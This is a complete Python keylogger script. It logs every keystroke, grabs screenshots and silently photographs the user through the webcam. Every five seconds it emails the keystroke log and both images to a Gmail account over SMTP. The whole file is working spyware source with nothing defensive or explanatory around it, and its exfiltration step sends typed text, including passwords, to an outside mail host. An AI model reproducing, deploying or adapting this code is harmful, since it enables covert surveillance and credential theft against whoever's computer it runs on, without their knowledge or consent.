import smtplib
import threading
from pynput import keyboard
from PIL import ImageGrab
import cv2
import os
import tempfile
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

time_interval = 5
email = 'your_mail@gmail.com'
password = 'your_app_password'
log = "KeyLogger start\n"

def append_to_log(string: str) -> None:
    global log
    log += string

def on_press(key) -> None:
    try:
        current_key = str(key.char)
    except AttributeError:
        if key == key.space:
            current_key = " "
        elif key == key.esc:
            return False
        else:
            current_key = " " + str(key) + " "

    append_to_log(current_key)

# Function to take a screenshot
def take_screenshot() -> str:
    screenshot = ImageGrab.grab()
    temp_dir = tempfile.gettempdir()
    screenshot_path = os.path.join(temp_dir, "screenshot.png")
    screenshot.save(screenshot_path)
    return screenshot_path

# Function to take a photo from the front camera
def take_photo() -> str:
    temp_dir = tempfile.gettempdir()
    photo_path = os.path.join(temp_dir, "photo.png")
    cam = cv2.VideoCapture(0)
    
    if cam.isOpened():
        ret, frame = cam.read()
        if ret:
            cv2.imwrite(photo_path, frame)
    cam.release()
    return photo_path

# Function to send an email with the log, screenshot, and photo
def send_mail(email: str, password: str, message: str, screenshot_path: str = None, photo_path: str = None) -> None:
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = "Keylogger Report"

    msg.attach(MIMEText(message, 'plain'))

    if screenshot_path:
        attachment = open(screenshot_path, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(screenshot_path)}")
        msg.attach(part)
        attachment.close()

    if photo_path:
        attachment = open(photo_path, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(photo_path)}")
        msg.attach(part)
        attachment.close()

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    text = msg.as_string()
    server.sendmail(email, email, text)
    server.quit()

def report_n_send() -> None:
    global log
    screenshot_path = take_screenshot()
    photo_path = take_photo()
    send_mail(email, password, "\n\n" + log, screenshot_path, photo_path)
    log = ""
    timer = threading.Timer(time_interval, report_n_send)
    timer.start()

def start_keylogger() -> None:
    keyboard_listener = keyboard.Listener(on_press=on_press)
    with keyboard_listener:
        report_n_send()
        keyboard_listener.join()

start_keylogger()
